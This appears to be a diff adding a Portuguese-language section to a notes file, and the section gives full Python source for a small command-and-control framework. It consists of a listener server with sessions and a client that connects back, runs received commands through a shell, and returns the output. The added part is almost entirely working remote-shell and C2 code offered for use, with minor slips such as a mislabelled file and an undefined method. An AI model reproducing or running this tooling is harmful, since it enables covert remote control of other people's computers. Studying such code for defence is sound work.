@@ -8061,6 +8061,268 @@ Para validar que a funcionalidade de login esteja funcionando corretamente após
 Você deverá visualizar o portal da área logada `dashboard.php`, garantindo que a correção não afetou a funcionalidade de login do portal.
 Se precisar de mais alguma coisa, estou aqui para ajudar! 🎉
 
+## ASIP
+
+Codigos em python para criar um C2 (Command & Control)
+
+Codigo servidor.py abaixo
+
+	import argparse
+	import socket
+	import threading
+	
+	import colorama
+	from console import Console
+	from sessao import Sessao
+	
+	colorama.init(autoreset=True)
+	
+	class Servidor(Console):
+	    prompt = f"{colorama.Fore.RED}C2 > {colorama.Fore.RESET}"
+	    
+	    def __init__(self):
+	        super().__init__()
+	        self.sessoes = []
+	        self.sockets = []
+	        self.contador_sessao = 1
+	
+	    def criar_listener(self, porta):
+	        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	        sock.bind(("0.0.0.0", porta))
+	        sock.listen(5)
+	        
+	        self.sockets.append(sock)
+	        print(f"Escutando na porta {porta}...")
+	
+	        while True:
+	            try:
+	                sock.settimeout(5)
+	                conexao, endereco = sock.accept()
+	                sock.settimeout(None)
+	                print(f"{colorama.Fore.GREEN}[+] Sessão #{self.contador_sessao} estabelecida - {endereco}")
+	                sessao = Sessao(conexao, self.sessoes, self.contador_sessao)
+	                self.sessoes.append(sessao)
+	                self.contador_sessao += 1
+	            except socket.timeout:
+	                continue
+	            except OSError:
+	                break
+	    
+	    def comando_servidor(self, args):
+	        parser = argparse.ArgumentParser(prog='servidor', add_help=False)
+	        parser.add_argument('-p', '--porta', type=int)
+	        
+	        try:
+	            args = parser.parse_args(args.split())
+	        except:
+	            return
+	        
+	        if args.porta:
+	            threading.Thread(target=self.criar_listener, args=(args.porta,), daemon=True).start()
+	        else:
+	            print("Comando do servidor inválido.")
+	    
+	    def comando_sessoes(self, args):
+	        
+	        parser = argparse.ArgumentParser(prog='sessoes', add_help=False)
+	        parser.add_argument('-i', '--interagir', type=int)
+	        
+	        try:
+	            args = parser.parse_args(args.split())
+	        except:
+	            return
+	        
+	        if args.interagir is not None:
+	            sessao = self.encontrar_sessao(args.interagir)
+	            if sessao:
+	                sessao.interagir()
+	            else:
+	                print(f"{colorama.Fore.RED}[!] Seção {args.interagir} inválida !")
+	        else:
+	            print("Comando sessoes inválido.")
+	    
+	    def encontrar_sessao(self, id):
+	        for sessao in self.sessoes:
+	            if sessao.id == id:
+	                return sessao
+	
+	if __name__ == "__main__":
+	    servidor = Servidor()
+	    servidor.prompt_loop()
+
+Codigo client.py abaixo
+
+	import socket
+	import subprocess
+	import time
+	
+	
+	class C2Client:
+	    def __init__(self, host, porta):
+	        self.host = host
+	        self.porta = porta
+	        self.conexao = None
+	
+	    def conectar(self):
+	        while True:
+	            try:
+	                self.conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	                self.conexao.connect((self.host, self.porta))
+	                print(f"Conectado em {self.host}:{self.porta}")
+	                self.escuta_por_comandos()
+	            except (socket.error, ConnectionRefusedError) as e:
+	                print(f"Falha na conexão: {e}. Tentando novamente em 5 segundos...")
+	                time.sleep(5)
+	
+	    def executar_comando(self, comando):
+	        funcao, _, argumentos = comando.partition(" ")
+	        try:
+	            funcao = getattr(self, f'comando_{funcao}')
+	            if funcao and argumentos:
+	                retorno = funcao(argumentos)
+	            elif funcao and not argumentos:
+	                retorno = funcao("")
+	            if retorno:
+	                return True
+	        except AttributeError:
+	            print(f"Nenhum comando chamado '{funcao}' foi encontrado.")
+	        
+	
+	    def escuta_por_comandos(self):
+	        while True:
+	            try:
+	                dados = self.receber_dados().decode()
+	                self.executar_comando(dados)
+	            except Exception as e:
+	                print(f"Erro: {e}")
+	                break
+	
+	    def comando_shell(self, comando):
+	        try:
+	            saida = subprocess.check_output(comando, shell=True, stderr=subprocess.PIPE, timeout=4)
+	            print(saida)
+	            if saida != b"":
+	                self.enviar_dados(saida)
+	            else:
+	                self.enviar_dados("OK")
+	        except Exception as e:
+	            self.enviar_dados(f"Erro no shell: {e}")
+	            print(f"Erro no shell: {e}")
+	    
+	    def enviar_dados(self, buffer):
+	        if not isinstance(buffer, bytes):
+	            buffer = buffer.encode()
+	        try:
+	            self.conexao.sendall(buffer)
+	            return True
+	        except:
+	            return False
+	            
+	    def receber_dados(self):
+	        dados = self.conexao.recv(1024)
+	        if not dados:
+	            raise ConnectionError("Conexão encerrada durante a recepção")
+	        return dados
+	    
+	if __name__ == "__main__":
+	    host = "127.0.0.1"
+	    porta = 4445
+	    client = C2Client(host, porta)
+	    client.conectar()
+
+Código console.py abaixo
+
+	class Console:
+	    prompt = 'Console > '
+	    
+	    def pegar_prompt(self):
+	        return self.prompt
+	                  
+	    def prompt_loop(self):
+	        while True:
+	            try:
+	                linha = input(self.pegar_prompt()).strip()
+	                if self.executar_comando(linha) and linha.startswith("sair"):
+	                    break
+	            except KeyboardInterrupt:
+	                print("[!] Detectado Ctrl+C. Digite 'sair' para encerrar ou continue usando o programa.")
+	            except EOFError:
+	                print("[!] Detectado Ctrl+D. Saindo...")
+	                return True
+	            except Exception as e:
+	                print(f"[!] Erro inesperado: {e}")
+	    
+	    def executar_comando(self, comando):
+	        # Separa a função dos argumentos
+	        # Ex: "servidor -p 4445" -> "servidor", " ", "-p 4445"
+	        funcao, _, argumentos = comando.partition(" ")
+	        try:
+	            # Procura pela função dentro da classe
+	            funcao = getattr(self, f'comando_{funcao}')
+	            # Verifica se tem algo escrito ou o input está em branco
+	            if funcao and argumentos:
+	                # Se achar executa a função com os argumentos
+	                retorno = funcao(argumentos)
+	            # Chama funções sem argumentos
+	            elif funcao and not argumentos:
+	                retorno = funcao("")
+	                
+	            if retorno:
+	                return True
+	        except AttributeError:
+	            print(f"Nenhum comando chamado '{funcao}' foi encontrado.")
+
+Código console.py abaixo
+
+	import colorama
+	from console import Console
+	
+	
+	class Sessao(Console):
+	    prompt = 'Sessão > '
+	    
+	    def __init__(self, conexao, sessoes, id):
+	        super().__init__()
+	        self.conexao = conexao
+	        self.sessoes = sessoes
+	        self.id = id
+	        self.endereco = self.conexao.getpeername()
+	    
+	    def interagir(self):
+	        """
+	        Permite interação com a sessão (e.g., shell).
+	        """
+	        print(f"Interagindo com a sessão: {self.endereco}")
+	        
+	        self.prompt = f"{colorama.Fore.GREEN}Sessão #{self.id} {colorama.Fore.BLUE}➜ {colorama.Fore.CYAN}{self.endereco[0]}@{self.endereco[1]}{colorama.Fore.RESET}: "
+	        
+	        self.prompt_loop()
+	    
+	    def comando_shell(self, comando):
+	        comando = comando.strip()
+	        resposta = self.mandar_comando(comando)
+	        print(resposta)
+	    
+	    def mandar_comando(self, comando):
+	        self.enviar_dados(f"shell {comando}")
+	        resposta = self.receber_dados().decode()
+	        return resposta.strip()
+	        
+	    def enviar_dados(self, buffer):
+	        if not isinstance(buffer, bytes):
+	            buffer = buffer.encode()
+	        try:
+	            self.conexao.sendall(buffer)
+	            return True
+	        except TimeoutError:
+	            self.printar(f"{colorama.Fore.RED}[!] Timeout durante o envio dos dados: {buffer}")
+	        
+	    def receber_dados(self):
+	        dados = self.conexao.recv(1024)
+	        if not dados:
+	            raise ConnectionError("Conexão encerrada durante a recepção")
+	        return dados
 
 TO BE CONTINUED
 .
